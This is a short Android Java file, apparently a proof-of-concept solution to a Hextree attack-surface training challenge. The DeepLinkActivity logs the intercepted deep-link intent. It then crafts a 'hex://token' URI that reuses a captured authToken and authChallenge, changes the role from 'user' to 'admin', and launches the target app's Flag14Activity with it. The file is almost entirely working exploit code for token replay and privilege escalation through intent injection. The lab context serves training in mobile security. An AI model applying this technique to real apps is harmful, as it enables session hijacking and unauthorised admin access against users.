package com.poc.hextree;

import android.content.Intent;
import android.net.Uri;
import android.os.Bundle;
import android.util.Log;

import androidx.activity.EdgeToEdge;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.graphics.Insets;
import androidx.core.view.ViewCompat;
import androidx.core.view.WindowInsetsCompat;

public class DeepLinkActivity extends AppCompatActivity {
    public String packageName = "io.hextree.attacksurface";


    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        EdgeToEdge.enable(this);
        setContentView(R.layout.activity_deep_link);

        Intent intent = getIntent();
        Log.i("deeplink intent", Utils.dumpIntent(this,intent));
        Utils.showDialog(this,intent);

        Uri data = intent.getData();
        Log.i("data", String.valueOf(data));

        String solution = "hex://token??authToken=598cc075e4379d027f61c02866917c6f1d992c67&type=admin&authChallenge=89bfa7ac-98f8-47c7-ac51-1c482875b0b4";
//        hex://token?authToken=598cc075e4379d027f61c02866917c6f1d992c67&type=user&authChallenge=89bfa7ac-98f8-47c7-ac51-1c482875b0b4

        Intent intent2 = new Intent("android.intent.action.VIEW");
        intent2.setData(Uri.parse(solution));
        intent2.setClassName(packageName,packageName+".activities.Flag14Activity");
        startActivity(intent2);
    }
}